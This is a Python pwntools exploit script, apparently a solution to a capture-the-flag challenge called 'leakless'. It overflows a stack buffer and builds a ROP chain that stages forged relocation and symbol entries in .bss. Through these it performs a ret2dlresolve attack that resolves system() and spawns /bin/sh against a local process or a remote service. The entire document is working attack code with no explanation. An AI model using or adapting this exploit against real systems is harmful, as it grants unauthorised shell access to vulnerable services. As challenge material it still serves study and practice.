#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./leakless"
libc = ELF("/usr/lib32/libc-2.33.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def craft_read(addr, size):
    # call read(0, addr, size)
    rop_pop_3 = 0x08048699# pop esi ; pop edi ; pop ebp ; ret
    payload = p32(elf.plt['read'])
    payload += p32(rop_pop_3)
    payload += p32(0)
    payload += p32(addr)
    payload += p32(size)
    return payload


fname = b"system" + b"\x00"
farg = b"/bin/sh" + b"\x00"

# address
addr_bss = elf.get_section_by_name(".bss").header["sh_addr"]
addr_stage = addr_bss + 0x800
log.info("stage@bss: 0x{:08x}".format(addr_stage))
addr_reloc = addr_bss + 0xa00
log.info("reloc@bss: 0x{:08x}".format(addr_reloc))
addr_plt = elf.get_section_by_name(".plt").header["sh_addr"]
addr_relplt = elf.get_section_by_name(".rel.plt").header["sh_addr"]
addr_arg = addr_bss + len(fname)
log.info("arg@bss: 0x{:08x}".format(addr_arg))
addr_dynsym = elf.get_section_by_name(".dynsym").header["sh_addr"]
addr_dynstr = elf.get_section_by_name(".dynstr").header["sh_addr"]
addr_sym = addr_bss + 0xa80 | (addr_dynsym & 0xF)
log.info("sym@bss: 0x{:08x}".format(addr_arg))
base_stage = addr_bss + 0x800

# buf
payload = b"A" * 76
# stager (write address using read)
payload += craft_read(addr_stage, 0x80)
payload += craft_read(addr_reloc, 0x8)
payload += craft_read(addr_sym, 0x10)
payload += craft_read(addr_bss, len(fname))
payload += craft_read(addr_arg, len(farg))
payload += p32(0x0804869b)# pop ebp; ret
payload += p32(base_stage)
payload += p32(0x080484a5)# leave; ret
payload += b"E" * (0x80 - len(payload))

# stage@bss
reloc_offset = addr_reloc - addr_relplt
payload2 = b"B" * 4
payload2 += p32(addr_plt)
payload2 += p32(reloc_offset)
payload2 += b"C" * 4
payload2 += p32(addr_arg)
payload2 += b"D" * (0x80 - len(payload2))

# reloc@addr_sym
reloc = p32(elf.got['exit'])
reloc += p32((int((addr_sym - addr_dynsym) / 0x10) << 8) | 7)

# sym@bss
sym = p32(addr_bss - addr_dynstr)
sym += p32(0)
sym += p32(0)
sym += p32(0x12)

sleep(0.5)
p.send(payload)
sleep(0.5)
p.send(payload2)
sleep(0.5)
p.send(reloc)
sleep(0.5)
p.send(sym)
sleep(0.5)
p.send(fname)
sleep(0.5)
p.send(farg)

p.interactive()
